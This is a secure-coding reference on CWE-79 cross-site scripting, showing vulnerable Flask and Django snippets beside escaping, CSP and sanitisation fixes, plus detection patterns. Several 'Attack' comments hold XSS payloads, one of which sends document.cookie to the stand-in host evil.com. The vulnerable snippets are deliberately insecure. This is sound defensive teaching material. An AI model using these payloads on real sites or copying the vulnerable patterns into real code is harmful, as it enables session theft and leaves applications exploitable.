# CWE-79: Cross-site Scripting (XSS)

## Definition
The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.

## Severity
**HIGH** (CVSS 6.1 - 7.5)

## Types of XSS
1. **Reflected XSS**: Malicious script comes from the current HTTP request
2. **Stored XSS**: Malicious script comes from the website's database
3. **DOM-based XSS**: Vulnerability exists in client-side code

## Vulnerable Code Examples

### Python/Flask - Direct Rendering
```python
# VULNERABLE - User input directly in HTML
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return f"<h1>Hello, {name}!</h1>"

# Attack: ?name=<script>alert('XSS')</script>
```

### Python - String Formatting in Templates
```python
# VULNERABLE - F-string HTML construction
def render_profile(user):
    return f"""
    <div class="profile">
        <h2>{user.name}</h2>
        <p>{user.bio}</p>
        <a href="{user.website}">Website</a>
    </div>
    """

# Attack: user.name = "<script>document.location='evil.com?c='+document.cookie</script>"
```

### Python - Unsafe Template Variables
```python
# VULNERABLE - Marking as safe without sanitization
from flask import Markup
content = Markup(user_input)  # Dangerous!

# VULNERABLE - Django mark_safe
from django.utils.safestring import mark_safe
html = mark_safe(user_content)
```

### JavaScript Injection Points
```python
# VULNERABLE - User input in onclick
html = f'<button onclick="doAction(\'{user_input}\')">Click</button>'

# VULNERABLE - User input in script tag
html = f'<script>var data = "{user_data}";</script>'

# Attack: user_input = "'); alert('XSS'); ('"
```

## Secure Code Examples

### HTML Escaping
```python
# SECURE - Use html.escape()
import html

@app.route('/greet')
def greet():
    name = html.escape(request.args.get('name', ''))
    return f"<h1>Hello, {name}!</h1>"
# < becomes &lt;, > becomes &gt;, etc.
```

### Use Template Engine Auto-Escaping
```python
# SECURE - Jinja2 auto-escapes by default
from flask import render_template

@app.route('/profile/<username>')
def profile(username):
    user = get_user(username)
    return render_template('profile.html', user=user)

# profile.html - Auto-escaped
# <h1>{{ user.name }}</h1>
```

### Django Auto-Escaping
```python
# SECURE - Django templates auto-escape
# template.html
# {{ user.name }}  <!-- Auto-escaped -->

# Only use |safe when content is TRUSTED and pre-sanitized
# {{ trusted_html|safe }}
```

### Content Security Policy
```python
# SECURE - Add CSP headers
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

### Sanitize Rich Text (if needed)
```python
# SECURE - Use bleach for HTML sanitization
import bleach

ALLOWED_TAGS = ['b', 'i', 'u', 'a', 'p', 'br']
ALLOWED_ATTRS = {'a': ['href', 'title']}

clean_html = bleach.clean(
    user_html,
    tags=ALLOWED_TAGS,
    attributes=ALLOWED_ATTRS,
    strip=True
)
```

## Context-Specific Escaping

| Context | Escape Method |
|---------|---------------|
| HTML Body | `html.escape()` |
| HTML Attribute | `html.escape()` + quote attribute |
| JavaScript | JSON encode: `json.dumps()` |
| URL | `urllib.parse.quote()` |
| CSS | Whitelist values only |

## Detection Patterns
- F-strings with HTML: `f"<.*{variable}`
- Direct string concatenation in HTML
- `Markup()` or `mark_safe()` with user input
- Template `|safe` filter with untrusted data

## References
- https://cwe.mitre.org/data/definitions/79.html
- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
